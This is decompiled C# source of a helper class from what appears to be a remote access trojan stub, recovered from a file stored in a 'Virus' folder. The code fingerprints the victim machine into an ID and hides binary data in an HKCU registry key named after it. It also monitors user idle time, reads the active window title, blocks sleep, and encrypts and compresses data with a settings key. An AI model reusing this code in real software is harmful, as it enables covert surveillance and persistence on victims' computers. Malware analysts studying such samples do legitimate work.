// Decompiled with JetBrains decompiler
// Type: Stub.Helper
// Assembly: DesignV3Sv, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7FCAC0DD-9A5C-4DA4-BFB3-EE6355E60533
// Assembly location: C:\Users\hadesker\Desktop\Virus\DesignV\DesignV3Sv.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

#nullable disable
namespace Stub
{
  [StandardModule]
  internal sealed class Helper
  {
    public static bool ProcessDpi = false;
    private const string Alphabet = "abcdefghijklmnopqrstuvwxyz";
    public static Random Random = new Random();
    public static readonly string PL = "Software\\" + Helper.ID();
    public static string current = Process.GetCurrentProcess().MainModule.FileName;
    private static int idletime;
    private static Helper.LASTINPUTINFO lastInputInf = new Helper.LASTINPUTINFO();
    public static TimeSpan sumofidletime = new TimeSpan(0L);
    public static int LastLastIdletime;
    public static string Time;
    public static string[] userAgents = new string[3]
    {
      "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
    };
    public static Mutex _appMutex;

    [DllImport("SHCore.dll", SetLastError = true)]
    public static extern int SetProcessDpiAwareness(int awareness);

    public static bool IsValidDomainName(string name)
    {
      return Uri.CheckHostName(name) != UriHostNameType.Unknown;
    }

    public static string GetRandomString(int length)
    {
      StringBuilder stringBuilder = new StringBuilder(length);
      int num1 = checked (length - 1);
      int num2 = 0;
      while (num2 <= num1)
      {
        stringBuilder.Append("abcdefghijklmnopqrstuvwxyz"[Helper.Random.Next("abcdefghijklmnopqrstuvwxyz".Length)]);
        checked { ++num2; }
      }
      return stringBuilder.ToString();
    }

    [DllImport("user32.dll")]
    public static extern bool GetLastInputInfo(ref Helper.LASTINPUTINFO plii);

    public static int GetLastInputTime()
    {
      Helper.idletime = 0;
      Helper.lastInputInf.cbSize = Marshal.SizeOf<Helper.LASTINPUTINFO>(Helper.lastInputInf);
      Helper.lastInputInf.dwTime = 0;
      if (Helper.GetLastInputInfo(ref Helper.lastInputInf))
        Helper.idletime = checked (Environment.TickCount - Helper.lastInputInf.dwTime);
      return Helper.idletime > 0 ? checked ((int) Math.Round(unchecked ((double) Helper.idletime / 1000.0))) : 0;
    }

    public static object LastAct()
    {
      while (true)
      {
        Thread.Sleep(1000);
        int lastInputTime = Helper.GetLastInputTime();
        if (Helper.LastLastIdletime > lastInputTime)
          Helper.sumofidletime = Helper.sumofidletime.Add(TimeSpan.FromSeconds((double) Helper.LastLastIdletime));
        else
          Helper.Time = Conversions.ToString(Helper.GetLastInputTime());
        Helper.LastLastIdletime = lastInputTime;
      }
      object obj;
      return obj;
    }

    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern Helper.EXECUTION_STATE SetThreadExecutionState(
      Helper.EXECUTION_STATE esFlags);

    public static void PreventSleep()
    {
      try
      {
        int num = (int) Helper.SetThreadExecutionState(Helper.EXECUTION_STATE.ES_CONTINUOUS | Helper.EXECUTION_STATE.ES_DISPLAY_REQUIRED | Helper.EXECUTION_STATE.ES_SYSTEM_REQUIRED);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string GetActiveWindowTitle()
    {
      try
      {
        StringBuilder text = new StringBuilder(256);
        if (Helper.GetWindowText(Helper.GetForegroundWindow(), text, 256) > 0)
          return text.ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return "";
    }

    public static byte[] SB(string s) => Encoding.UTF8.GetBytes(s);

    public static string BS(byte[] b) => Encoding.UTF8.GetString(b);

    public static string ID()
    {
      string str;
      try
      {
        str = Helper.GetHashT(Environment.ProcessorCount.ToString() + Environment.UserName + Environment.MachineName + (object) Environment.OSVersion + (object) new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "Err HWID";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static string GetHashT(string strToHash)
    {
      byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(strToHash));
      StringBuilder stringBuilder = new StringBuilder();
      byte[] numArray = hash;
      int index = 0;
      while (index < numArray.Length)
      {
        byte num = numArray[index];
        stringBuilder.Append(num.ToString("x2"));
        checked { ++index; }
      }
      return stringBuilder.ToString().Substring(0, 20).ToUpper();
    }

    public static bool SetValue(string name, byte[] value)
    {
      try
      {
        using (RegistryKey subKey = Registry.CurrentUser.CreateSubKey(Helper.PL, RegistryKeyPermissionCheck.ReadWriteSubTree))
        {
          subKey.SetValue(name, (object) value, RegistryValueKind.Binary);
          return true;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return false;
    }

    public static byte[] GetValue(string value)
    {
      try
      {
        using (RegistryKey subKey = Registry.CurrentUser.CreateSubKey(Helper.PL))
          return (byte[]) RuntimeHelpers.GetObjectValue(subKey.GetValue(value));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return (byte[]) null;
    }

    public static byte[] Decompress(byte[] input)
    {
      using (object obj1 = (object) new MemoryStream(input))
      {
        byte[] numArray = new byte[4];
        object Instance1 = obj1;
        object[] objArray1 = new object[3]
        {
          (object) numArray,
          (object) 0,
          (object) 4
        };
        object[] Arguments1 = objArray1;
        bool[] flagArray1 = new bool[3]
        {
          true,
          false,
          false
        };
        bool[] CopyBack1 = flagArray1;
        NewLateBinding.LateCall(Instance1, (Type) null, "Read", Arguments1, (string[]) null, (Type[]) null, CopyBack1, true);
        if (flagArray1[0])
          numArray = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1[0]), typeof (byte[]));
        object int32 = (object) BitConverter.ToInt32(numArray, 0);
        using (object obj2 = (object) new GZipStream((Stream) obj1, CompressionMode.Decompress))
        {
          object obj3 = (object) new byte[checked (Conversions.ToInteger(Operators.SubtractObject(int32, (object) 1)) + 1)];
          object Instance2 = obj2;
          object[] objArray2 = new object[3]
          {
            RuntimeHelpers.GetObjectValue(obj3),
            (object) 0,
            RuntimeHelpers.GetObjectValue(int32)
          };
          object[] Arguments2 = objArray2;
          bool[] flagArray2 = new bool[3]
          {
            true,
            false,
            true
          };
          bool[] CopyBack2 = flagArray2;
          NewLateBinding.LateCall(Instance2, (Type) null, "Read", Arguments2, (string[]) null, (Type[]) null, CopyBack2, true);
          if (flagArray2[0])
            obj3 = RuntimeHelpers.GetObjectValue(objArray2[0]);
          if (flagArray2[2])
            RuntimeHelpers.GetObjectValue(objArray2[2]);
          return (byte[]) obj3;
        }
      }
    }

    public static byte[] Compress(byte[] input)
    {
      using (object Instance1 = (object) new MemoryStream())
      {
        object bytes = (object) BitConverter.GetBytes(input.Length);
        object Instance2 = Instance1;
        object[] objArray1 = new object[3]
        {
          RuntimeHelpers.GetObjectValue(bytes),
          (object) 0,
          (object) 4
        };
        object[] Arguments1 = objArray1;
        bool[] flagArray1 = new bool[3]
        {
          true,
          false,
          false
        };
        bool[] CopyBack1 = flagArray1;
        NewLateBinding.LateCall(Instance2, (Type) null, "Write", Arguments1, (string[]) null, (Type[]) null, CopyBack1, true);
        if (flagArray1[0])
          RuntimeHelpers.GetObjectValue(objArray1[0]);
        using (object Instance3 = (object) new GZipStream((Stream) Instance1, CompressionMode.Compress))
        {
          object Instance4 = Instance3;
          object[] objArray2 = new object[3]
          {
            (object) input,
            (object) 0,
            (object) input.Length
          };
          object[] Arguments2 = objArray2;
          bool[] flagArray2 = new bool[3]
          {
            true,
            false,
            false
          };
          bool[] CopyBack2 = flagArray2;
          NewLateBinding.LateCall(Instance4, (Type) null, "Write", Arguments2, (string[]) null, (Type[]) null, CopyBack2, true);
          if (flagArray2[0])
            input = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[0]), typeof (byte[]));
          NewLateBinding.LateCall(Instance3, (Type) null, "Flush", new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
        }
        return (byte[]) NewLateBinding.LateGet(Instance1, (Type) null, "ToArray", new object[0], (string[]) null, (Type[]) null, (bool[]) null);
      }
    }

    public static byte[] AES_Encryptor(byte[] input)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
      byte[] numArray;
      try
      {
        rijndaelManaged.Key = cryptoServiceProvider.ComputeHash(Helper.SB(Settings.KEY));
        rijndaelManaged.Mode = CipherMode.ECB;
        ICryptoTransform encryptor = rijndaelManaged.CreateEncryptor();
        byte[] inputBuffer = input;
        numArray = encryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return numArray;
    }

    public static byte[] AES_Decryptor(byte[] input)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
      byte[] numArray;
      try
      {
        rijndaelManaged.Key = cryptoServiceProvider.ComputeHash(Helper.SB(Settings.KEY));
        rijndaelManaged.Mode = CipherMode.ECB;
        ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor();
        byte[] inputBuffer = input;
        numArray = decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return numArray;
    }

    public static bool CreateMutex()
    {
      bool createdNew;
      Helper._appMutex = new Mutex(false, Settings.Mutex, out createdNew);
      return createdNew;
    }

    public static void CloseMutex()
    {
      if (Helper._appMutex == null)
        return;
      Helper._appMutex.Close();
      Helper._appMutex = (Mutex) null;
    }

    public struct LASTINPUTINFO
    {
      [MarshalAs(UnmanagedType.U4)]
      public int cbSize;
      [MarshalAs(UnmanagedType.U4)]
      public int dwTime;
    }

    public enum EXECUTION_STATE : uint
    {
      ES_SYSTEM_REQUIRED = 1,
      ES_DISPLAY_REQUIRED = 2,
      ES_CONTINUOUS = 2147483648, // 0x80000000
    }
  }
}
